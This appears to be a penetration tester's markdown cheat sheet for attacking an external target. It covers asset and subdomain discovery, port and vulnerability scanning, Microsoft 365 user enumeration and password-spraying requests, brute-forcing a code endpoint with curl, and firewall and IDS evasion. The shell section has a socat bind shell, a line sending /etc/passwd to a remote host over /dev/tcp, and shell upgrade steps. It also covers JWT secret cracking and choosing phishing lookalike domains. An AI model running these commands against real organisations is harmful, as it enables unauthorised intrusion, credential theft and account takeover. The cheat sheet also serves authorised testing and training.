   # external

## Information Gathering - Initial Knowledge
### understanding the target
- https://www.crunchbase.com/discover/acquisitions
- wikipedia
- main website > check structure, group, subcompanies, other units

### searching for assets
- `site:pastebin.com "target"`
- `site:trello.com "target"`
- `site:postman.com "target"`
- authenticated in pastebin
- jira
- search repos
    * `site:github.com "target"`
    * `site:gitlab.com "target"`
    * https://github.com/search?q=target&type=code
- leaks
- social medias (https://www.social-searcher.com/)

#### checking repos 
* manually
* https://github.com/gitleaks/gitleaks
* `trufflehog github --org=TARGET --only-verified --include-members --json --token github_... > github.json`
```sh
cat github.json | jq 'select (.Verified == true)'
```

```sh
cat github.json | jq 'select (
  (.Verified != true) and
  (.SourceMetadata.Data.Github.link | test("(yarn|test|lock[.]json|Podfile.lock|go[.]sum|composer.lock)") | not) and
  (.Raw | test("(localhost|example|CONTINUOUS_INTEGRATION|127.0.0[.]1|user.pass|username.password)") | not) and
  (.DetectorName | test("(Box)") | not)
) | [.SourceMetadata.Data.Github.link,.DetectorName,.Raw]'
```

## Information Gathering - Finding Attack Surfaces

### getting seeds (initial domains)
* `amass intel -d target -whois`
* [spider](web.md#spider)
* google
* googling copyright text, terms of service, privacy policy
* save different registrants to search:
    * nserver in https://search.dnslytics.com/search?d=domains&q=ns:ns.target.com
    * registrant email in search engines
    * https://viewdns.info/reversewhois/
    * security trails (soa records)
* search relations: https://builtwith.com/relationships/example.com
* host.io
* zone files: https://czds.icann.org/
    * ?https://opendata.rapid7.com/sonar.fdns_v2/
* whoxy.com
* robtex.com
* search target cnpjs
- domains with other suffixes
    * `curl -s 'https://publicsuffix.org/list/public_suffix_list.dat' | grep -vE '^//' | sort -u | parallel -j 100 --results ~/project/curl/{} curl -si TARGET.{}`

### getting subdomains
#### subdomain scraping
* [subdomains.sh](subdomains.sh)
    * security trails
    * subfinder
    * crt
    * amass
* theHarvester: `python theHarvester.py -d TARGET -b binaryedge,rapiddns,crtsh,subdomaincenter,subdomainfinderc99`
* github search (https://github.com/gwen001/github-subdomains)
* shodan (shosubgo)

#### subdomain bruting
- **Important and simple step ⚠️**
- check wildcards: try to resolve a invalid subdomain and check if it will return a record
- `shuffledns -d example.com -w subdomains-top1million-110000.txt -r resolvers.txt -mode bruteforce`
- more wordlists: https://wordlists.assetnote.io/

#### zone transfer
- manual
   * can affect just one ns of the target
   * `host -t NS example.com`
   * `host -l example.com ns.example.com`
   * `host -t AXFR example.com ns2.example.com`
* `dnsrecon -d example.com -t axfr`

### finding ips and ASNS
- search.censys.io (validating: `openssl s_client -showcerts -connect $ip:443  <<< "Q"`)
- shodan.io/search?query=example.com
- https://bgp.he.net/
- https://bgpview.io/
- enumerating asn: `amass intel -asn $ASN_NUMBER`
- ip address history
    - https://securitytrails.com/domain/example.com/history/a
    - https://viewdns.info/iphistory/?domain=example.com
    - https://builtwith.com/relationships/example.com
    - passivedns.mnemonic.no
    - shodan
    - censys

### reverse dns lookup
* **⚠️ TIP: This step is important to identify and filter third-party hosts. For instance, if an IP address is being resolved to cloudfront.net, this host is managed by amazon, so it is better to avoid infrastructure scans/tests on it.**
* `host -t ptr IP` 
* https://github.com/hakluke/hakrevdns
   * `function prips() { for range in "$@"; do nmap -sL -n $range | awk '/Nmap scan report/{print $NF}' | tail +2 | head -n -1; done }`
   * `prips RANGE_IP | hakrevdns -r 1.1.1.1`
* https://ipinfo.io/ips/1.1.1.0/24
* passivedns.mnemonic.no
* recon-ng: reverse_resolve
* tab DNS from https://bgp.he.net/net/{NETBLOCK}
* bing ip:"1.1.1.1"

## MS365 
- [gather emails](web.md#gathering-users-emails-cpfs)
- password leaks: dehashed, scylla.so, breachdirectory.org, HIBP, pastebin, google
- user enumeration (0,5,6 indicate the user is valid)
```http
POST /common/GetCredentialType?mkt=en HTTP/1.1
Host: login.microsoftonline.com
User-Agent: ...
Content-type: application/json; charset=UTF-8
Accept: application/json
Origin: https://login.microsoftonline.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: en,pt-BR;q=0.9,pt;q=0.8,en-US;q=0.7

{"username":"user@domain.tld"}
```

- password spraying + user enumeration
```http
POST /common/oauth2/token HTTP/1.1
Host: login.microsoftonline.com
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Connection: close

resource=https%3A%2F%2Fgraph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&client_info=1&grant_type=password&username=username%40domain.tld&password=Password1&scope=openid
```

### post
- vpn
- admin center
- portal azure (portal.azure.com)
- outlook, teams

## Scanning
- subdomain takeover
    - dnsreaper
    - [subdomains.sh](subdomains.sh)
    - look for:
        * amazonaws.com
        * cloudapp.net (azure)
        * azurewebsites.net
        * myshopify.com
        * github.io
        * herokuapp.com
        * cloudfront.net
        * home.blog (wordpress)
    - https://github.com/EdOverflow/can-i-take-over-xyz
    - https://0xpatrik.com/subdomain-takeover-basics/ 
    1) search CNAMEs pointing to available domains or services
    2) search NS and MX's domains available

- get web services
    * `httpx -p http:80,8080,8000,8008,8888,9090,https:443,8443 -l hosts.txt -o web.txt`
- web screenshots
    * `gowitness scan file -f web.txt --write-db ; gowitness report server`
- buckets
   - search engine + https://buckets.grayhatwarfare.com/buckets
   - brute s3 buckets (`gobuster s3 -k --wordlist subdomains.txt`)
      - also replacing "." by "-" or nothing
   - walking through all web apps looking for "amazonaws"
   - `trufflehog s3 --bucket=bucket name`
- walking through web apps looking for "eyJ"
   - `hashcat -m 16500 jwts.txt ~/scraped-JWT-secrets.txt`
- port scan
    * prepare and filter the ip addresses to be scanned
        - `prips $(cat ips.ranges.txt) > ips.all.txt`
        - `cat subdomains.csv | grep -vE '\.(r.cloudfront|static.akamaitechnologies|exacttarget.com|sendgrid.net)' | cut -d, -f3 | tail +2 >> ips.all.txt`
        - `cat ips.all.txt | awk '!x[$0]++' | tee -p ips.all.txt`
    * quickly scan (low hangfruits)
        - `nmap -sS -Pn -n -v3 --open -iL ips.all.txt -oG nmap.short.tcp.txt -p 21,22,23,445,2049,3306,3389,5900` 
    * full tcp scan
        - `naabu -Pn -exclude-cdn -exclude-ports 80,443 -list ips.all.txt -o naabu.full.tcp.txt -p -`
        - `masscan -p 0-79,81-442,444-65535 -iL ips.all.txt -oG masscan.full.tcp.txt --open #--resume paused.conf`
        - rustscan
    * udp scan
        - `nmap -sUV -v3 --top-ports 23 --open -iL ips.all.txt -oG nmap.udp.txt`
- default credentials
   * https://github.com/x90skysn3k/brutespray
### vulnerability scan
- nessus
- jaeles scanner
- intrigue core
- sn1per 
- https://github.com/RetireJS/retire.js

#### nuclei
- base: `nuclei -l web.txt -H "User-Agent: X" -o nuclei.APPROACH.results.txt -stats -retries 4 -timeout 35 -mhe 100 2>>nuclei.log` 
   * fast: `-rate-limit 500 -bulk-size 125 #-resume resume-file.cfg`
   * 2gb ram: `-rate-limit 25 -c4 -bs 50`
- approaches
1) sniper
```sh
-t http/miscellaneous/directory-listing.yaml \
-t http/exposures/configs/phpinfo-files.yaml \
-t http/exposures/apis/swagger-api.yaml \
-t http/exposures/apis/wadl-api.yaml \
-t http/exposures/apis/wsdl-api.yaml \
-t http/exposures/configs/laravel-env.yaml \
-t http/misconfiguration/aws/aws-object-listing.yaml \
-t http/misconfiguration/glpi-directory-listing.yaml \
-t http/misconfiguration/springboot \
-t http/exposures/logs \
-t http/takeovers \
-t dns \
-t cloud
```
2) new
`-new-templates`
3) gold
`-exclude-severity info -etags cve,wordpress,wp-plugin,tech,ssl`
4) underground
5) reverse sniper

## Content discovery
- `for url in $(cat web.txt); do ffuf -H 'User-Agent: x' -r -c -recursion -recursion-depth 5 -w ../wordlist.txt -u $url/FUZZ -o "$(echo $url | sed 's/^http[s]\?...//' | sed 's/\///g')".ffuf.json ; done`
- `cat site.ffuf.json | jq '.results | sort_by(.length) | .[]' | jq -C '{"length","status","words","lines","content-type","url"} | select (.status != 403)' | less -R`
- [more content discovery](web.md#content-discovery)

## Intruder Alternatives
- curl + parallel: `seq -f '%04g' 1000 9999 | parallel -j 100 --results 'curl_output/{1}' curl --path-as-is -i -s -k -X 'POST' -H "'Content-Type: application/x-www-form-urlencoded'" -H "'User-Agent: Mozilla...'" --data-binary "'code={1}'" "'https://target.com/api/checkcode'"`

## Collaborator Alternative
- https://app.interactsh.com
- https://github.com/projectdiscovery/interactsh
    * `interactsh-client -v`

## techniques against inbound network firewall
* ipv6
* set a source port
    * nmap --source-port 53
    * nc -p 53
* if internal: spoof mac
* if rce: remote port forwarding
* ?spoof ip

- bypass IDS/IPS: send ip spoofed packets with the true
    * ex: nmap -D RND:30

- traceroute to understand firewall (try traceroute udp & tcp with different ports, icmp)


## exploitation
- identify service version
    - nmap
    - manual approach
- search for exploits
    * https://www.exploit-db.com (or searchsploit)
    * github (search cve)
    * google
    * https://packetstormsecurity.com

- check default credentials
    - https://cirt.net/passwords 
    - https://open-sez.me/

- password spraying
    - Company@Year
    - o365spray
    - if found cred, try in vpn


### email
- SPF: identify servers allowed to send emails on behalf of the domain, should be configured with "-all" or use DMARC
    - "~all" can cause softfail, DMARC interprets SPF Softfail as a 'Pass' or 'Fail' depending on its email server settings
- host -t txt example.com

- DMARC policies
- Monitor, also called none policy, is the most basic DMARC policy and specified by “p=none.” The monitor enables monitoring and sends all emails (including failed authentication) to maintain regular traffic flow.
- Quarantine: The quarantine policy is specified by “p=quarantine,” which sends unqualified emails (those that fail authentication) to the recipient’s trash or spam folder. 
- Reject: The Reject policy prevents unqualified emails (those with failed authentication) from reaching their intended recipient. The reject policy, specified by “p=reject”.
- host -t txt _dmarc.example.com
    * https://emkei.cz/
    * ?sendgrid
- https://dmarcreport.com/content/spf-authentication-fails/

## shell
* netcat can be used with metasploit inline payloads
* socat, netcat alternative:
    * socat tcp4-listen:8080 EXEC:/bin/bash
    * socat - tcp4:duck.com:80

* bash native support to reverse shell: /dev/protocol/host/port
    * cat /etc/passwd >/dev/tcp/host/port

* encrypted shell is better to avoid detection
    * ncat has encryption support
    * openssl s_client -connect example.com:443

* upgrading shell
```bash
stty raw -echo
nc -lvp 1234
python -c 'import pty; pty.spawn("/bin/bash")'
```

### techniques against outbound network firewall
* try popular ports (443/tcp, 80/tcp, 53/udp, 22/tcp)
* ipv6
* if rce: 
    - dnscat2
    - write output in a public directory (web server, smb, ...) in the file system
* ?non tcp/udp protocols (icmp)


## phishing
- urlcrazy: look for domains to use in phishing attacks
